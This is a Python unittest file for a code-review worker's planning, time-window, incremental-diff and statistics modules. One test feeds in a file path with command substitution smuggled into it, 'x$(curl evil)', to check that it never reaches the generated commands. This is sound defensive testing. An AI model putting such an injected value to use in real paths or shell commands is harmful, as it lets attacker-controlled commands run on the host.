"""Tests for nightshift.py and incremental.py (LABS-311) — the worker's
plan/window/recurrence/passstats surface. linear_queue.py's tests live in
test_linear_queue.py (LABS-684 round 3)."""

import os
import sys
import unittest
from datetime import datetime, timezone

# The pipeline modules under test (facts, incremental) live in the
# stellar-review plugin (ADR-0623): STELLAR_ROOT names the installed
# opencode-stellar-review package root. The night-shift modules
# (nightshift, passstats, recurrence) are this repository's, beside
# these tests.
if not os.environ.get("STELLAR_ROOT"):
    raise unittest.SkipTest(
        "STELLAR_ROOT not set — point it at an installed "
        "opencode-stellar-review package root (ADR-0623)")
sys.path.insert(0, os.path.join(os.environ["STELLAR_ROOT"], "skills", "stellar-review", "tools"))
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import facts  # noqa: E402
import incremental  # noqa: E402
import nightshift  # noqa: E402
import passstats  # noqa: E402
import recurrence  # noqa: E402
from helpers import RepoFixture, f, led, utc  # noqa: E402

class TestWindow(unittest.TestCase):
    def test_winter_cet(self):  # UTC+1
        self.assertFalse(nightshift.in_window(utc(1)))   # 02:00 CET
        self.assertTrue(nightshift.in_window(utc(2)))    # 03:00 CET
        self.assertTrue(nightshift.in_window(utc(5)))    # 06:00 CET
        self.assertFalse(nightshift.in_window(utc(6)))   # 07:00 CET

    def test_summer_cest(self):  # UTC+2
        self.assertFalse(nightshift.in_window(utc(0, 7)))
        self.assertTrue(nightshift.in_window(utc(1, 7)))
        self.assertFalse(nightshift.in_window(utc(5, 7)))

class TestPlan(unittest.TestCase):
    A = "relate/relate-executor/src/a.rs"
    B = "relate/relate-executor/src/b.rs"
    C = "relate/relate-core/src/c.rs"

    def run_plan(self, ledgers, busy=(), now=None, **kw):
        return nightshift.plan(ledgers, set(busy), now or utc(3), kw.get("escalate_at", 25),
                               kw.get("max_files", 8), kw.get("force", False))

    def test_dedup_clusters_and_tiers(self):
        q = self.run_plan([led(f("F-1", self.A), f("F-2", self.B, "blocker", q="x"), f("F-3", self.C),
                               f("F-9", self.A, status="resolved")),
                           led(f("G-1", self.A, q="F-1"))])
        self.assertEqual(q["open_findings"], 3)
        tiers = {c["crate"].rsplit("/", 1)[-1]: c["test_tier"] for c in q["runnable"]}
        self.assertEqual(tiers, {"relate-executor": "unit", "relate-core": "full"})
        self.assertEqual(q["runnable"][0]["crate"], "relate/relate-executor")  # blocker first

    def test_split_never_exceeds_max_files(self):
        fs = [f(f"F-{i}", f"relate/relate-executor/src/m{i}.rs", q=str(i)) for i in range(5)]
        q = self.run_plan([led(*fs)], max_files=2)
        self.assertEqual([len(c["files"]) for c in q["runnable"]], [2, 2, 1])

    def test_outside_window_defers_unless_forced(self):
        l = [led(f("F-1", self.A))]
        q = self.run_plan(l, now=utc(12))
        self.assertEqual(q["runnable"], [])
        self.assertEqual(len(q["deferred_outside_window"]), 1)
        self.assertEqual(len(self.run_plan(l, now=utc(12), force=True)["runnable"]), 1)

    def test_busy_files_hold_cluster(self):
        q = self.run_plan([led(f("F-1", self.A))], busy=[self.A])
        self.assertEqual(q["runnable"], [])
        self.assertEqual(q["held_busy"][0]["files"], [self.A])

    def test_escalation_threshold(self):
        fs = [f(f"F-{i}", self.A, q=str(i)) for i in range(25)]
        self.assertTrue(self.run_plan([led(*fs)])["escalate"])
        self.assertFalse(self.run_plan([led(*fs[:24])])["escalate"])

class TestIncrementalBase(RepoFixture):
    def test_rebased_ledger_never_falls_back_to_main_merge_base(self):
        self.write("a.rs", "fn a() {}\n")
        base = self.commit("base")
        facts.git(self.dir, "checkout", "-q", "-b", "pr")
        self.write("a.rs", "fn a() { 1; }\n")
        old = self.commit("pr1")
        # main moves; the PR is rebased (force-push) onto it
        facts.git(self.dir, "checkout", "-q", "main")
        self.write("other.rs", "fn other() {}\n")
        self.commit("main moves")
        facts.git(self.dir, "checkout", "-q", "pr")
        facts.git(self.dir, "rebase", "-q", "main")
        head = facts.git(self.dir, "rev-parse", "HEAD").strip()
        self.assertNotEqual(old, head)
        b, why = incremental.resolve_base(self.dir, old, head)
        self.assertEqual(why, "diverged-merge-base")
        self.assertEqual(b, base)
        patch = incremental.incremental_patch(self.dir, b, head, ["a.rs"])
        self.assertIn("a.rs", patch)
        self.assertNotIn("other.rs", patch)  # main's commit never anchors a finding

    def test_invalid_or_missing_last_head(self):
        self.write("a.rs", "x\n")
        head = self.commit("c")
        self.assertEqual(incremental.resolve_base(self.dir, None, head), (None, "no-valid-last-head"))
        self.assertEqual(incremental.resolve_base(self.dir, "z" * 40, head), (None, "no-valid-last-head"))
        self.assertEqual(incremental.resolve_base(self.dir, "a" * 40, head), (None, "last-head-unreachable"))

    def test_ancestor_is_used_directly(self):
        self.write("a.rs", "x\n")
        c1 = self.commit("c1")
        self.write("a.rs", "y\n")
        c2 = self.commit("c2")
        self.assertEqual(incremental.resolve_base(self.dir, c1, c2), (c1, "ancestor"))

class TestRecurrence(unittest.TestCase):
    def test_counts_by_checklist_and_round(self):
        a = f("F-1", "p"); b = f("F-2", "p"); b["checklist_id"] = "std-6"; b["round_filed"] = 2
        a["round_filed"] = 1
        c = recurrence.count([led(a, b)])
        self.assertEqual(c["std-1"], 1)
        self.assertEqual(recurrence.count([led(a, b)], since_round=2), {"std-6": 1})

class TestWorkerAndLinear(unittest.TestCase):
    A = "relate/relate-executor/src/a.rs"

    def queue(self):
        return TestPlan().run_plan([led(f("F-1", self.A, "blocker"))])

    def test_commands_per_tier(self):
        c = self.queue()["runnable"][0]
        self.assertEqual(c["test_commands"][-1], "cargo test -p relate-executor")
        core = TestPlan().run_plan([led(f("F-1", TestPlan.C))])["runnable"][0]
        self.assertIn("--workspace", core["test_commands"][-1])

    def test_scope_check(self):
        c = self.queue()["runnable"][0]
        self.assertEqual(nightshift.out_of_scope(c, [self.A, "relate/relate-executor/tests/t.rs"]), [])
        self.assertEqual(nightshift.out_of_scope(c, ["relate/relate-core/src/x.rs"]),
                         ["relate/relate-core/src/x.rs"])

    def test_key_stable_across_plans(self):
        self.assertEqual(self.queue()["runnable"][0]["key"], self.queue()["runnable"][0]["key"])

    def test_plan_with_empty_tasks_is_ok(self):
        q = nightshift.plan([], set(), utc(3), 25, 8, False, [])
        self.assertEqual(q["runnable"], [])

    def test_hostile_ledger_paths_never_reach_commands(self):
        evil = "relate/x$(curl evil)/src/a.rs"
        q = TestPlan().run_plan([led(f("F-1", evil), f("F-2", "relate/relate-core/src/ok.rs"))])
        for c in q["runnable"]:
            self.assertTrue(all("evil" not in x for x in c["test_commands"] + c["files"]))
        self.assertEqual(q["open_findings"], 1)

class TestPassstats(unittest.TestCase):
    def test_missrate(self):
        base = [{"path": "a", "start_line": 10, "severity": "medium"}] * 20
        cand = [{"path": "a", "start_line": 12, "severity": "nit"}]
        self.assertEqual(passstats.miss_rate(base, cand)["verdict"], "acceptable")
        self.assertEqual(passstats.miss_rate(base, [])["verdict"], "too-lossy")
        self.assertEqual(passstats.miss_rate(base[:3], [])["verdict"], "insufficient-sample")

class TestLiteralPathspecs(RepoFixture):
    def test_magic_filename_is_literal(self):
        self.write("a.rs", "x\n")
        self.write(":(exclude)b.rs", "x\n")
        b = self.commit("base")
        self.write("a.rs", "y\n")
        self.write(":(exclude)b.rs", "y\n")
        h = self.commit("pr")
        patch = incremental.incremental_patch(self.dir, b, h, ["a.rs", ":(exclude)b.rs"])
        self.assertIn("a.rs", patch)
        self.assertIn("b.rs", patch)

if __name__ == "__main__":
    unittest.main()
